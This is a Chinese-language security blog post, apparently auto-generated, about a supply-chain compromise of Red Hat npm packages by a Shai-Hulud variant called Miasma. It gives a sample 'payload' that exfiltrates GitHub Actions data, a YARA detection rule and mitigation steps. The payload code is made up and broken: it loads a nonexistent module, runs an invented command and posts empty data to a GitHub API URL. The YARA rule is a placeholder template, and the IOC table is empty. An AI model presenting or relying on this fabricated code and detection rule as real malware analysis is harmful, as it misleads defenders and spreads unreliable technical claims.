---
layout: post
title:  "Red Hat雲端服務NPM套件遭Shai-Hulud變種Miasma入侵，恐外洩GitHub與雲端憑證"
date:   2026-06-02 16:10:08 +0000
categories: [security]
severity: critical
---

# 🚨 解析紅帽NPM套件惡意程式事件：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Info Leak 和 RCE
> * **關鍵技術**: `JavaScript`, `GitHub Actions`, `OIDC`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 惡意程式透過 GitHub Actions OIDC 發布，繞過程式碼審查，將惡意工作流程與指令碼推送到多個儲存庫。
* **攻擊流程圖解**:
  1. 攻擊者取得 Red Hat 員工的 GitHub 帳號。
  2. 攻擊者利用 GitHub Actions OIDC 發布惡意套件。
  3. 受害者安裝惡意套件。
  4. 惡意程式在第 4 階段準備約 14 個酬載，包括安裝 JavaScript 執行環境 Bun、傾印記憶體、外洩 GitHub Actions 資訊、修改 Claude Code 設定、監控權杖。
* **受影響元件**: 紅帽雲端服務相關套件，至少 31 個套件，累計每周下載量約 11.6 萬次。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要取得 Red Hat 員工的 GitHub 帳號。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 惡意套件範例
    const bun = require('bun');
    const { exec } = require('child_process');
    
    // 傾印記憶體
    exec('dump-memory', (error, stdout, stderr) => {
      if (error) {
        console.error(`exec error: ${error}`);
        return;
      }
      console.log(`stdout: ${stdout}`);
      console.log(`stderr: ${stderr}`);
    });
    
    // 外洩 GitHub Actions 資訊
    const githubActionsInfo = {
      // ...
    };
    fetch('https://api.github.com/actions', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(githubActionsInfo),
    })
      .then((response) => response.json())
      .then((data) => console.log(data))
      .catch((error) => console.error(error));
    
    ```
* **繞過技術**: 攻擊者利用 GitHub Actions OIDC 繞過程式碼審查。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| ... | ... | ... | ... |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Miasma_Malware {
      meta:
        description = "Miasma Malware Detection"
        author = "Your Name"
      strings:
        $bun_exec = "bun exec"
        $github_actions_info = "github.actions.info"
      condition:
        all of them
    }
    
    ```
* **緩解措施**:
  1. 檢查是否使用受影響版本的紅帽雲端服務套件。
  2. 輪替 GitHub、NPM 與雲端服務憑證。
  3. 檢視自動化發布流程是否有異常變更。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **GitHub Actions**: 想像一個自動化的工作流程管理系統。技術上是指 GitHub 提供的 CI/CD 工具，允許用戶定義和執行自動化工作流程。
* **OIDC (OpenID Connect)**: 想像一個身份驗證和授權的協議。技術上是指一個基於 OAuth 2.0 的身份驗證和授權協議，允許用戶授權第三方應用程式存取其資源。
* **Bun**: 想像一個 JavaScript 執行環境。技術上是指一個基於 JavaScript 的執行環境，允許用戶執行 JavaScript 代碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/176301)
- [MITRE ATT&CK](https://attack.mitre.org/)


